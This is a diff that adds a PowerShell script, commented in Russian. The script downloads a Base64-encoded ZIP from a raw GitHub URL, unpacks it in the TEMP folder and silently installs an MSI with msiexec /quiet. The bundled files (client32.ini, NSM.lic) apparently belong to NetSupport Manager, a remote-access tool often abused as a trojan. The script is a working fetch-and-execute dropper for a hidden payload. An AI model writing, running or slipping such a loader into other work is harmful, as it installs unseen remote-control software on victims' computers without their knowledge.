@@ -1,0 +1,33 @@
+# URL с Base64-кодированным ZIP-файлом
+$url = "https://raw.githubusercontent.com/lawyerd999/frame/refs/heads/main/zip.txt"
+
+# Скачиваем содержимое файла (Base64-строку)
+$base64Content = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
+
+# Декодируем Base64-строку в массив байтов
+$zipBytes = [Convert]::FromBase64String($base64Content)
+
+# Задаём путь для сохранения ZIP-файла во временной папке
+$zipPath = Join-Path $env:TEMP "archive.zip"
+[System.IO.File]::WriteAllBytes($zipPath, $zipBytes)
+
+# Задаём папку для распаковки содержимого
+$destFolder = Join-Path $env:TEMP "memInstall"
+if (Test-Path $destFolder) { Remove-Item $destFolder -Recurse -Force }
+New-Item -Path $destFolder -ItemType Directory | Out-Null
+
+# Распаковываем ZIP-файл в указанную папку (операция выполняется синхронно)
+Expand-Archive -Path $zipPath -DestinationPath $destFolder -Force
+
+# Определяем пути к ожидаемым файлам
+$msiPath = Join-Path $destFolder "mem.msi"
+$iniPath = Join-Path $destFolder "client32.ini"
+$licPath = Join-Path $destFolder "NSM.lic"
+
+# Проверяем, что все файлы успешно извлечены
+if ((Test-Path $msiPath) -and (Test-Path $iniPath) -and (Test-Path $licPath)) {
+    # Запускаем установку mem.msi с параметром /quiet
+    Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$msiPath`" /quiet" -Wait
+} else {
+    Write-Error "Извлечение завершилось с ошибкой: один или несколько файлов отсутствуют."
+}
